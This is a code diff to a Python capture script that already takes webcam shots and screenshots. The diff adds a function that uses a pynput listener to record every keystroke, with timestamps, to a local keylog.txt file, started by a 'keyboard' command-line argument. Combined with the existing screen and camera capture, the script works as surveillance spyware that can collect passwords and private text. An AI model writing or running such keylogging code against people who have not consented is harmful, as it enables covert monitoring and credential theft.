@@ -9,10 +9,12 @@ import os
 import sys
 import random
 import time
+import logging
 from datetime import datetime
 
 # install packages
 from cv2 import VideoCapture, imwrite
+from pynput.keyboard import Key, Listener
 import pyautogui
 
 
@@ -101,6 +103,17 @@ def captureScreen():
     img.save(savefileName)
     time.sleep(randomDelay)
 
+# function to save keylog
+def captureKeyboard():
+  print('Capturing Keyboard...')
+  logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+  def on_press(key):
+    logging.info(str(key))
+
+  with Listener(on_press=on_press) as listener:
+    listener.join()
+
 
 # initialize program
 if __name__ == '__main__':
@@ -112,6 +125,9 @@ if __name__ == '__main__':
     
     if sys.argv[1] == 'screen':
       captureScreen()
+
+    if sys.argv[1] == 'keyboard':
+      captureKeyboard()
 
   except KeyboardInterrupt:
     print('Capture Complete...')
